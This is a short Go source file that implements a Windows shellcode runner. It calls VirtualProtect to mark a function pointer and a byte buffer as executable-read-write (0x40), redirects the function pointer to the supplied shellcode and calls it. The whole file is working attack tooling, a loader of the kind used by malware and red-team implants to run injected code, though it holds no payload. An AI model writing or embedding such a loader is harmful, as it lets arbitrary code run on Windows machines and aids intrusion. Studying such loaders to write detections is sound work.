package pkg

import (
	"syscall"
	"unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func Run(shellcode []byte) {
	// Make a function ptr
	shellcodefunc := func() {}

	// Change permissions on shellcodefunc function ptr
	var oldfpemissions uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&shellcodefunc))),
		unsafe.Sizeof(uintptr(0)),
		uint32(0x40),
		unsafe.Pointer(&oldfpemissions)) {
		panic("Call to VirtualProtect failed!")
	}

	// Override function ptr
	**(**uintptr)(unsafe.Pointer(&shellcodefunc)) = *(*uintptr)(unsafe.Pointer(&shellcode))

	// Change permissions on shellcode string data
	var oldscepermissions uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&shellcode))),
		uintptr(len(shellcode)),
		uint32(0x40),
		unsafe.Pointer(&oldscepermissions)) {
		panic("Call to VirtualProtect failed!")
	}

	shellcodefunc()
}
